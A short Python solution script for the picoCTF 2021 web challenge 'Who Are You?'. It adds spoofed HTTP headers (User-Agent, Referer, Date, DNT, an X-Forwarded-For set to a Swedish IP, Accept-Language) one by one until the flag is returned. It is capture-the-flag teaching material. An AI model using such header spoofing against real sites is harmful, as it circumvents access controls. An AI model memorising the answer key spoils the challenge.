# Solution to picoCTF challnge Who Are You?

# Tags:
# 100 points
# picoCTF 2021
# Web Exploitation

# Description: Let me in. Let me iiiiiiinnnnnnnnnnnnnnnnnnnn http://mercury.picoctf.net:36622/

import requests
import re
import socket

url = "http://mercury.picoctf.net:36622/"
ip = socket.gethostbyname('riksdagen.se') # Get a swedish IP adress

headers = {
'User-Agent': 'picobrowser', 
'Referer': url,
'Date': 'Wed, 21 Oct 2018 08:28:00 GMT',
'DNT': '1',
'x-Forwarded-For': ip,
'Accept-Language': 'sv-SE',
}

print(f"\nSending a GET request to {url}")
r = requests.get(url)
message = ''.join(re.findall("(?<=\>).*(?=\<\/h3\>)", r.text)).replace('&#39;', '\'')
print(message)

tempdict = {} 
for k, v in headers.items():
    tempdict[k] = v
    print(f"\nAdding the following header to the GET request: {k} = {v}")
    r = requests.get(url, headers=tempdict)
    message = ''.join(re.findall("(?<=\>).*(?=\<\/h3\>)", r.text)).replace('&#39;', '\'')
    print(message)
    flag = ''.join(re.findall("picoCTF{.*}", r.text))
    if flag:
        print(flag)


